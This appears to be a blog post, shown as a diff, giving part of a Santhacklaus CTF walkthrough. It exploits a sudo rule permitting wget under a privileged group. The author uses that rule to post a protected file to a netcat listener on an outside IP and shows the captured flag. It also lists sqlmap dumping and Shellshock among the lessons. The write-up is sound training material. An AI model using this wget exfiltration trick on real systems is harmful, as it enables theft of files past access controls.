+<p><img src="/img/santhacklaus/netrunner11.png" alt="" /></p>
+
+<p>Look at the file <code>client.note</code>. It say : <code>Note: the password is the same than your username.</code>
+Why is necessary to know the user password ? To be able to execute sudo !!!</p>
+
+<pre><code>puppet-master@2a87f3ade358:~$ sudo -l
+[sudo] password for puppet-master: 
+Matching Defaults entries for puppet-master on 2a87f3ade358:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, lecture=never
+
+User puppet-master may run the following commands on 2a87f3ade358:
+    (puppet-master : zetatech-maintenance) /usr/bin/wget
+</code></pre>
+
+<p>Yeah ! The exploit is here ! What can we do ? User <code>puppet-master</code> can execute wget with group permission of <code>zetatech-maintenance</code>. Good ! Look at the <code>puppet-master</code> home</p>
+
+<pre><code>puppet-master@2a87f3ade358:~$ ls -al
+total 36
+dr-xr-x--- 1 root puppet-master        4096 Dec 16 13:30 .
+drwxr-xr-x 1 root root                 4096 Dec 11 08:01 ..
+-r-xr-x--- 1 root puppet-master         220 Dec 11 08:01 .bash_logout
+-r-xr-x--- 1 root puppet-master        3392 Dec 11 08:01 .bashrc
+-r-xr-x--- 1 root puppet-master         675 Dec 11 08:01 .profile
+drwxr-x--- 1 root puppet-master        4096 Dec 11 08:01 .ssh
+-rwxr----- 1 root puppet-master         439 Dec 10 13:52 client.note
+-rwxr-x--- 1 root puppet-master         746 Dec 10 13:52 status.sh
+-rwxr----- 1 root zetatech-maintenance  266 Dec 10 13:52 tech.note
+</code></pre>
+
+<p>The file <code>tech.note</code> can be read by group <code>zetatech-maintenance</code>. This is the file we need ! Let&rsquo;s exfiltrate it !</p>
+
+<p>First, launch my listener.</p>
+
+<pre><code>th1b4ud@pc-th1b4ud:~$ nc -lvp 4444
+listening on [any] 4444 ...
+</code></pre>
+
+<p>But before go further, what is <code>wget</code> ?</p>
+
+<p><code>GNU Wget (or just Wget, formerly Geturl, also written as its package name, wget) is a computer program that retrieves content from web servers. It is part of the GNU Project. Its name derives from World Wide Web and get. It supports downloading via HTTP, HTTPS, and FTP.</code></p>
+
+<p>Thanks again Wikipedia \o/</p>
+
+<p>So we can download file with <code>wget</code>. Can you upload/send some file too ? The answer is yes ! Look at the man.</p>
+
+<pre><code> --post-data=string
+ --post-file=file
+      Use POST as the method for all HTTP requests and send the specified data in the request body.  --post-data
+      sends string as data, whereas --post-file sends the contents of file.
+</code></pre>
+
+<p>This is the option we need ! Let&rsquo;s execute <code>wget</code> with <code>zetatech-maintenance</code> group permission.</p>
+
+<pre><code>sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
+</code></pre>
+
+<p>Ho ! Something appeared on the listener !</p>
+
+<pre><code class="language-bash">connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 58604
+POST / HTTP/1.1
+User-Agent: Wget/1.18 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 79.85.186.254:4444
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 266
+
+
+.___..___.___..__..___..___ __ .  .
+  _/ [__   |  [__]  |  [__ /  `|__|
+./__.[___  |  |  |  |  [___\__.|  |
+
+
+:::: Admin Note ::::
+
+Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.
+
+:: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
+</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>So what do we learned with this challenge ?</p>
+
+<ul>
+<li>Learn how to test an authentication form.</li>
+<li>Learn to use CAREFULLY Sqlmap to dump database’s content.</li>
+<li>Exploit Shellshock vulnerability to bypass restricted bash.</li>
+<li>Exploit sudo misconfiguration.</li>
+</ul>
+
+<p>Thanks again to the Santhacklaus CTF Team for all their challenges !</p>
+
+<p>Th1b4ud</p>
+
+	
+			
+
+			
+
+			
+          </section>
+          
+          	
+          
+        
+      <div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+	<p>&copy; 2019. All rights reserved.</p>
+</div>
+    </div>
+  </div>
+	
+
+	
+
+  
+</body>
+</html>
